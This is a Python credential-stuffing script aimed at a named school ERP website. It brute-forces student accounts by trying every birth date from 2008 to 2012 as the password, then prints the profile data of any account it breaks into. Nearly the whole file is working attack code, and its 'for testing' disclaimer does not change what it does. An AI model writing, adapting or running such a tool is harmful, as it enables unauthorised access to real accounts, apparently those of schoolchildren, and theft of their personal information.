import asyncio
import aiohttp
import argparse
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import logging
from tqdm.asyncio import tqdm_asyncio
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

class PasswordManager:
    def __init__(self):
        self.cracked_event = asyncio.Event()
        self.password_crack = []
        self.lock = asyncio.Lock()

    async def add_cracked_password(self, password):
        async with self.lock:
            self.password_crack.append(password)
            self.cracked_event.set()

    def is_cracked(self):
        return self.cracked_event.is_set()

class SPSPurneaERP:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = aiohttp.ClientSession()
        self.verification_token = None

    async def close(self):
        await self.session.close()

    async def get_verification_token(self):
        async with self.session.get(f"{self.base_url}/ERP") as response:
            response.raise_for_status()
            soup = BeautifulSoup(await response.text(), 'html.parser')
            token = soup.find('input', {'name': '__RequestVerificationToken'})
            if token:
                self.verification_token = token['value']
            else:
                raise ValueError("Verification token not found")

    async def perform_login(self, username, password):
        login_url = f"{self.base_url}/ERP"
        payload = {
            '__RequestVerificationToken': self.verification_token,
            'SessionName': '2024-2025',
            'LoginName': username,
            'Password': password,
        }
        async with self.session.post(login_url, data=payload) as response:
            response.raise_for_status()
            return await response.text()

    def check_login_success(self, response_text):
        return 'Welcome' in response_text

    def extract_profile_data(self, response_text):
        soup = BeautifulSoup(response_text, 'html.parser')
        return "\n".join(
            f"{label.get_text(strip=True):<30} {value.get_text(strip=True)}"
            for row in soup.find_all('div', class_='row')
            if (label := row.find('label', class_='col-md-4')) and 
            (value := row.find('div', class_='col-md-8'))
        )

async def generate_dates(start_year, end_year):
    start = datetime(start_year, 1, 1)
    end = datetime(end_year, 12, 31)
    return [(start + timedelta(days=i)).strftime('%d%m%Y') for i in range((end - start).days + 1)]

async def check_credentials(username, password, erp, manager, sem):
    async with sem:
        if manager.is_cracked():
            return
            
        try:
            start = datetime.now()
            response = await erp.perform_login(username, password)
            elapsed = (datetime.now() - start).total_seconds()
            
            if erp.check_login_success(response):
                profile = erp.extract_profile_data(response)
                await manager.add_cracked_password(password)
                logger.info(f"\n{Fore.GREEN}✅ CRACKED {username}:{password} ({elapsed:.2f}s){Style.RESET_ALL}")
                logger.info(f"{Fore.CYAN}{profile}{Style.RESET_ALL}")
        except Exception as e:
            logger.debug(f"{Fore.RED}❌ {password} failed: {str(e)}{Style.RESET_ALL}")

async def main_attack(username, start_year, end_year, concurrency):
    manager = PasswordManager()
    erp = SPSPurneaERP('https://spspurnea.in')
    
    try:
        await erp.get_verification_token()
        dates = await generate_dates(start_year, end_year)
        sem = asyncio.Semaphore(concurrency)
        
        logger.info(f"\n{Fore.YELLOW}🚀 Starting attack on {username}")
        logger.info(f"📅 Date range: {start_year}-{end_year}")
        logger.info(f"🎯 Total combinations: {len(dates)}")
        logger.info(f"🌀 Concurrency: {concurrency}\n")
        logger.info(f"\n{Fore.RED} This program, developed by RKGroup for testing, is provided as-is. Use at your own risk.\n\n")

        tasks = [check_credentials(username, pwd, erp, manager, sem) for pwd in dates]
        
        for future in tqdm_asyncio.as_completed(tasks, total=len(tasks), 
                                              bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.BLUE, Fore.RESET)):
            await future
            if manager.is_cracked():
                break
                
    finally:
        await erp.close()
        if not manager.is_cracked():
            logger.info(f"\n{Fore.RED}😢 No valid password found in date range{Style.RESET_ALL}")

def parse_args():
    parser = argparse.ArgumentParser(description="SPS Purnea ERP Credential Checker")
    parser.add_argument("username", help="Admission ID to test")
    parser.add_argument("-s", "--start-year", type=int, default=2008, help="Start year for date generation")
    parser.add_argument("-e", "--end-year", type=int, default=2012, help="End year for date generation")
    parser.add_argument("-c", "--concurrency", type=int, default=50, help="Maximum concurrent requests")
    return parser.parse_args()

if __name__ == "__main__":
    try:
        args = parse_args()
        asyncio.run(main_attack(
            args.username,
            args.start_year,
            args.end_year,
            args.concurrency
        ))
    except KeyboardInterrupt:
        logger.info(f"\n{Fore.RED}🛑 Operation cancelled by user{Style.RESET_ALL}")
